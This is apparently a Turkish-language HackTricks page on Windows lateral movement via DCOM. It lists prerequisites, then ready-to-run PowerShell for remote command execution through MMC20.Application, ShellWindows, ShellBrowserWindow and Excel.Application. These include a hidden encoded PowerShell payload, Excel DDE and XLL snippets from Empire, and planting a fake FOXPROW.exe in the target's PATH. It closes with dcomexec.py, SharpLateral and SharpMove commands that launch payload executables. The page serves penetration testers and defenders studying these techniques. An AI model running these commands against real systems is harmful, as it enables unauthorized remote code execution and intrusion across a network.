# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement, mevcut COM server’ları yeniden kullandığı için çekicidir; servis veya scheduled task oluşturmak yerine bunları RPC/DCOM üzerinden açığa çıkarır. Pratikte bu, başlangıç bağlantısının genellikle TCP/135 üzerinde başlayıp ardından dinamik olarak atanmış yüksek RPC portlarına geçmesi anlamına gelir.

## Prerequisites & Gotchas

- Genellikle hedef üzerinde local administrator context’e ihtiyaç duyarsınız ve remote COM server remote launch/activation’a izin vermelidir.
- **14 March 2023** tarihinden beri Microsoft, desteklenen sistemlerde DCOM hardening uygular. Düşük bir activation authentication level isteyen eski client’lar, en az `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` müzakere edilmedikçe başarısız olabilir. Modern Windows client’lar genellikle otomatik olarak yükseltilir, bu yüzden güncel tooling normalde çalışmaya devam eder.
- Manuel veya script tabanlı DCOM execution genellikle TCP/135 ile birlikte hedefin dynamic RPC port range’ine ihtiyaç duyar. Eğer Impacket'in `dcomexec.py` aracını kullanıyorsanız ve command output geri almak istiyorsanız, genellikle `ADMIN$` (veya yazılabilir/okunabilir başka bir share) için SMB access de gerekir.
- Eğer RPC/DCOM çalışıyor ama SMB blocked ise, `dcomexec.py -nooutput` yine de blind execution için kullanışlı olabilir.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Bu teknik hakkında daha fazla bilgi için orijinal gönderiye [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) bakın**

Distributed Component Object Model (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, hem DCOM hem de Component Object Model (COM) için kapsamlı dokümantasyon sağlar; DCOM için [buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve COM için [buradan](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) erişilebilir. DCOM uygulamalarının bir listesi PowerShell komutuyla alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM nesnesi, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in işlemlerinin betiklenmesini sağlar. Özellikle, bu nesne `Document.ActiveView` altında bir `ExecuteShellCommand` metoduna sahiptir. Bu metod hakkında daha fazla bilgiye [buradan](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) ulaşılabilir. Çalıştığını kontrol edin:

Bu özellik, bir DCOM uygulaması üzerinden ağ üzerinde komutların yürütülmesini kolaylaştırır. DCOM ile uzaktan bir admin olarak etkileşim kurmak için PowerShell aşağıdaki gibi kullanılabilir:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. Ardından ExecuteShellCommand yöntemi, uzak host üzerinde bir process çalıştırmak için çağrılabilir. Process aşağıdaki adımları içerir:

Yöntemleri kontrol et:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE elde et:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Son argüman pencere stilidir. `7` pencereyi simge durumunda tutar. Operasyonel olarak, MMC tabanlı execution genellikle `mmc.exe` sürecinin uzaktan payload’unu başlatmasına yol açar; bu, aşağıdaki Explorer-backed objects’ten farklıdır.

## ShellWindows & ShellBrowserWindow

**Bu technique hakkında daha fazla bilgi için orijinal yazıyı kontrol edin [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** object’inin açık bir "LaunchPermissions" eksikliğine sahip olduğu belirlendi ve bu da Administrators access veren permissions’a varsayılan olarak düşmesine neden oldu. Daha fazla ayrıntı için bir thread [burada](https://twitter.com/tiraniddo/status/817532039771525120) incelenebilir ve explicit Launch Permission olmayan objects’i filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET kullanımı önerilir.

İki specific object, `ShellBrowserWindow` ve `ShellWindows`, açık Launch Permissions eksiklikleri nedeniyle vurgulandı. `HKCR:\AppID\{guid}` altında bir `LaunchPermission` registry entry’sinin olmaması, açık permissions olmadığını gösterir.

`MMC20.Application` ile karşılaştırıldığında, bu objects genellikle OPSEC açısından daha sessizdir; çünkü command çoğu zaman uzak host üzerinde `mmc.exe` yerine `explorer.exe`’nin child’ı olarak sonlanır.

### ShellWindows

ProgID’si olmayan `ShellWindows` için, .NET methods `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID’si kullanılarak object instantiation’ı kolaylaştırır. Bu process, `ShellWindows` için CLSID’yi almak üzere OleView .NET’ten yararlanır. Bir kez instantiate edildikten sonra, `WindowsShell.Item` methodu üzerinden interaction mümkündür ve bu da `Document.Application.ShellExecute` gibi method invocation’a yol açar.

Object’i instantiate etmek ve commands’i uzaktan execute etmek için örnek PowerShell commands verilmiştir:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` benzerdir, ancak onu doğrudan CLSID’si üzerinden instantiate edebilir ve `Document.Application.ShellExecute`’e pivot yapabilirsiniz:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objects ile Lateral Movement

DCOM Excel nesnelerini sömürerek lateral movement gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral movement için Excel DDE kullanımına ilişkin tartışmayı [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) üzerinde okumanız önerilir.

Empire projesi, DCOM nesnelerini manipüle ederek Excel'in remote code execution (RCE) için kullanımını gösteren bir PowerShell scripti sağlar. Aşağıda, [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) içinde bulunan scriptten alınmış parçalar yer almaktadır; bunlar, RCE için Excel'i abuse etmenin farklı yöntemlerini göstermektedir:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Son araştırmalar, bu alanı `Excel.Application`'ın `ActivateMicrosoftApp()` metodu ile genişletti. Temel fikir, Excel'in sistem `PATH` içinde arama yaparak FoxPro, Schedule Plus veya Project gibi eski Microsoft uygulamalarını başlatmayı denemesidir. Bir operatör, bu beklenen isimlerden biriyle bir payload'ı hedefin `PATH`'inin parçası olan yazılabilir bir konuma yerleştirebilirse, Excel bunu çalıştırır.

Bu varyasyon için gereksinimler:

- Hedefte local admin
- Hedefte Excel kurulu olması
- Hedefin `PATH`'indeki yazılabilir bir dizine payload yazabilme

FoxPro aramasını kötüye kullanan pratik örnek (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Saldırı yapan host yerel `Excel.Application` ProgID kayıtlı değilse, uzaktaki nesneyi bunun yerine CLSID ile instantiate edin:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Uygulamada kötüye kullanıldığı görülen değerler:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement için Otomasyon Araçları

Bu teknikleri otomatikleştirmek için iki araç öne çıkar:

- **Invoke-DCOM.ps1**: Empire projesi tarafından sağlanan, uzak makinelerde kod çalıştırmak için farklı yöntemlerin çağrılmasını kolaylaştıran bir PowerShell scripti. Bu script, Empire GitHub repository’sinde bulunabilir.

- **SharpLateral**: Uzakta kod çalıştırmak için tasarlanmış bir araçtır ve şu komutla kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Otomatik Araçlar

- Powershell scripti [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), diğer makinelerde kod çalıştırmak için yorum satırıyla belirtilmiş tüm yöntemleri kolayca çağırmanı sağlar.
- Uzak sistemlerde DCOM kullanarak komut çalıştırmak için Impacket'in `dcomexec.py` aracını kullanabilirsin. Mevcut sürümler `ShellWindows`, `ShellBrowserWindow` ve `MMC20` destekler ve varsayılan olarak `ShellWindows` kullanır.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsin:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ayrıca [**SharpMove**](https://github.com/0xthirteen/SharpMove) kullanabilirsin
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
